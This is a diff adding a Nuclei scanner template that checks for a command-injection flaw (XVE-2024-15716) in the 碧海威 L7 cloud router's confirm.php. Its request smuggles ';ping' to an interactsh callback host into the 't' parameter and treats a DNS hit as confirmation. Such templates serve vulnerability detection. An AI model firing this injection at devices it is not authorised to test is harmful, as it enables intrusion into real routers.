@@ -1,0 +1,27 @@
+id: bihaiweiL7-confirm-RCE
+info:
+  tags: bihaiweiL7-confirm-RCE
+  name: 碧海威L7云路由无线运营版 confirm.php 命令注入漏洞复现(XVE-2024-15716)
+  author: xc
+  severity: high
+  description: |-
+    app="碧海威科技-L7云路由"
+    碧海威L7 confirm.php接口处存在RCE漏洞，恶意攻击者可能利用此漏洞执行恶意命令，获取服务器敏感信息，最终可能导致服务器失陷。
+
+http:
+  - raw:
+      - |
+        GET /notice/confirm.php?t=;ping%20{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+        - "dns"
+
+
+
+
+
+
